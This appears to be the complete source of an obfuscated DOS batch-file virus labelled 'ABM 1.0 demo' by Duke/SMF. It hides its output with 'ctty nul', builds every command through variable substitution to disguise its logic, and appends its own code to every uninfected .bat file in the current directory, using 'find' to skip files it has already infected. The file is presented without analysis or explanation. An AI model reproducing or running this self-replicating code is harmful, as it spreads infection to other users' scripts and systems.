;@set umn=ctty
;@set ct=nul
;@%umn% %ct%
;@set gf=if
;@set lxi="%0
;@set umn="
;@set he=goto
;@set pvj=;@
;@%gf% %lxi%==%umn% %he% %pvj%
;@set umn="%1
;@set ct="@
;@set lxi=;@z
;@%gf% %umn%==%ct% %he% %lxi%
;@set umn=echo.
;@set bss=@.bat
;@%umn%>%bss%
;@set jsi=find
;@set ga=";@"
;@set umn=%0
;@%jsi% %ga%<%umn%>>%bss%
;@set umn=for
;@set bdu=%%b
;@set ct=in
;@set lxi=(*.bat)
;@set hb=do
;@set ia=call
;@set dh=@
;@%umn% %bdu% %ct% %lxi% %hb% %ia% %dh% %dh% %bdu%
;@set umn=del
;@set ct=@.*
;@%umn% %ct%
;@%he% %pvj%
:;@z [ABM 1.0 demo] by Duke/SMF
;@set nwx=%2
;@%jsi% %ga%<%nwx%
;@set umn=errorlevel
;@set ct=1
;@set lxi=type
;@%gf% %umn% %ct% %lxi% %bss%>>%nwx%
:;@
